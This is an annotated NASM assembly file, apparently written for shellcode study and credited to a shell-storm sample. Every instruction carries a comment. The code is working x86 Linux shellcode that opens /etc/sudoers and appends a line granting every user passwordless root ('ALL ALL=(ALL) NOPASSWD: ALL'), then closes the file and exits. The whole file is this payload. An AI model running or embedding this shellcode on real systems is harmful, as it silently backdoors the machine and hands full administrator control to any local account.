; Filename: sudoers.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  sudoers shellcode from shell-storm
;	    www.shell-storm.org/shellcode/files/shellcode-62.php


global _start			

section .text
_start:


;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax	; clearing eax register
	push eax	; pushing 0 to the stack
	push 0x7372656f ; pushing /etc/sudoers
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp	; moving stack pointer to ebx
	mov cx, 0x401	; moving 1025 to ecx 
	mov al, 0x05	; moving 5 to eax for the open syscall
	int 0x80	; interupt to call syscall

	mov ebx, eax    ; move the returned fd into ebx

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax	; clear eax register again
	push eax	; push 0 to the stack
	push 0x0a4c4c41	; pushing ALL ALL=(ALL) NOPASSWD: ALL\n
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp	; moving stack pointer to ecx
	mov dl, 0x1c	; moving 28 to edx for the length
	mov al, 0x04	; moving 4 to eax for the write syscall
	int 0x80	; interupt to call syscall

	;close(file)
	mov al, 0x06	; move 6 to eax
	int 0x80	; interupt to call syscall

	;exit(0);
	xor ebx, ebx	; clear ebx register
	mov al, 0x01	; mov 1 to eax
	int 0x80	;interupt to call syscall
